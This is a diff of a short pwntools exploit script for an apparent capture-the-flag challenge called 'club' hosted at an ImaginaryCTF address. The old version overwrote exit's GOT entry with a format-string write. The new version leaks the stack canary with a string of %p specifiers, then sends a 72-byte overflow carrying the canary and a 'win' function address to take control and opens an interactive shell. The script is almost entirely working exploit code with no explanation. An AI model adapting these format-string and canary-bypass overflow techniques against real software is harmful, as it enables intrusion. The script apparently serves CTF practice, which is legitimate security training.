@@ -1,16 +1,18 @@
 from pwn import *
 
-DEBUG = True
+r = remote("puzzler7.imaginaryctf.org", 3003)
 
-if DEBUG:
-    r = process("./club")
-    gdb.attach(r, api=True)
-else:
-    r = remote("puzzler7.imaginaryctf.org", 3003)
+print(r.recvuntil(b"NAme?"))
 
-exit_got = 0x404048
+win = 0x0000000000401182
 
-payload = b"%4482p%10$hhn---" + p64(exit_got)
+payload = b"%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
+r.sendline(payload)
 
+output = r.recvuntil(b"drINk?")
+canary = int(output.split(b". WhAt")[0][-18:], 16)
+print(hex(canary))
+
+payload = b"a"*72 + p64(canary) + p64(0) + p64(win)
 r.sendline(payload)
 r.interactive()
